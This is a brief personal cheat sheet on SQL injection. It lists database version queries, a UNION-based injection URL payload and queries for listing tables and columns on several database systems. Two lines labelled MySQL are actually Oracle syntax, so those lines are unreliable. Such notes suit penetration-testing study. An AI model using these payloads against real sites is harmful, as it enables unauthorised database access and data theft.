---
title: SQL Database Attacks
created: '2020-05-22T00:37:53.644Z'
modified: '2020-05-29T23:26:06.762Z'
---

# SQL Database Attacks

## Finding datatbase version and type
Microsoft: SELECT @@version
MySQL: SELECT banner FROM v$version
MySQL: SELECT version FROM v$instance
Oracle: SELECT * FROM v$version
PostgreSQL: SELECT version()

Example UNION attack: `http://example.com/param='+UNION+SELECT+@@version--`

## Database tricks

SELECT table_name FROM information_schema.tables

Use this to list out some info about the database(Except Oracle)

## Oracle tricks

SELECT * FROM all_tables

Use this to list tables

SELECT * FROM all_tab_columns WHERE table_name = 'USERS'

Use this to list columns
